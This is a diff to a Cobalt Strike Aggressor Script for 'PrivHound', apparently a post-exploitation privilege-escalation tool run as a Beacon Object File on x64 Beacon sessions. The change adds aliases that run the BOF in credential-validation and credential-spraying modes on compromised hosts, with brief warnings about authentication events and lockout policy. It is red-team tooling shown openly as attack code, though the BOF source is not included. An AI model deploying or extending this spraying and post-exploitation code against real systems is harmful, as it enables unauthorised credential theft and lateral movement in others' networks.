@@ -1,5 +1,5 @@
 /*
- * PrivHound Iteration 2 Aggressor Script integration.
+ * PrivHound BOF Aggressor Script integration.
  *
  * Build the x64 BOF artifact and load this script from the repository,
  * load this file in an authorized Cobalt Strike lab, then run `privhound`.
@@ -23,23 +23,39 @@ sub privhound_callback {
     }
 }
 
-alias privhound {
-    local('$bid $handle $data $args $arch $bof_path $output_path');
+sub privhound_run {
+    local('$bid $mode $label $handle $data $args $arch $bof_path $output_path');
     $bid = $1;
+    $mode = $2;
+    $label = $3;
     $arch = barch($bid);
     if ($arch ne "x64") {
-        berror($bid, "PrivHound Iteration 2 supports x64 Beacon sessions only");
+        berror($bid, "PrivHound supports x64 Beacon sessions only");
         return;
     }
     $bof_path = script_resource("../bof/build/privhound. $+ $arch $+ .bof.o");
     $handle = openf($bof_path);
     $data = readb($handle, -1);
     closef($handle);
-    $args = "";
+    $args = $mode;
     $output_path = "privhound_$+ $bid $+ .ndjson";
     $handle = openf(">" . $output_path);
     closef($handle);
-    btask($bid, "Running PrivHound Iteration 2 BOF");
+    btask($bid, "Running PrivHound BOF ($label)");
     beacon_inline_execute($bid, $data, "go", $args, &privhound_callback);
+}
+
+alias privhound {
+    privhound_run($1, "", "safe metadata-only mode");
+}
+
+alias privhound_validate_creds {
+    btask($1, "Credential validation explicitly requested; this creates authentication events");
+    privhound_run($1, "validate-creds", "claimed-user credential validation");
+}
+
+alias privhound_spray_creds {
+    btask($1, "Credential spraying explicitly requested; review lockout policy first");
+    privhound_run($1, "spray-creds", "local credential reuse testing");
 }
 
